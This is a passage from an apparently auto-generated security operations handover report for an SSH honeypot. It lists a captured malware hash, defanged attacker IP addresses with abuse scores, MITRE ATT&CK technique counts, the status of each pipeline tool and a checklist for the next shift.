| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `89.190.156[.]109` | NL | Alsycon B.V. | VPS - Dedicated Servers - Colocation | **100** ⚠️ | 1 |
| `91.99.110[.]230` | DE | Hetzner Online GmbH | **100** ⚠️ | 1 |
| `98.71.8[.]129` | IE | Microsoft Corporation | **100** ⚠️ | 20 |
| `187.141.71[.]166` | MX | Uninet S.A. de C.V. | **100** ⚠️ | 50 |
| `116.193.190[.]100` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `103.189.235[.]33` | SG | Cloud Host Pte Ltd | **100** ⚠️ | 50 |
| `143.64.168[.]136` | CN | Shanghai Blue Cloud Technology Co.,Ltd | **100** ⚠️ | 50 |
| `120.48.52[.]58` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 48 |
| `112.74.242[.]167` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `117.128.86[.]100` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 206 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 128 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 76 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 38 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 38 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 211 cases |
| Tool 34  | Credential Extractor        | ✅ 204 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 14 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 12 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 76 priority case(s) shown individually · 12 recon entry/entries in table (6 group(s) consolidating 127 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-19T14:44:37Z_
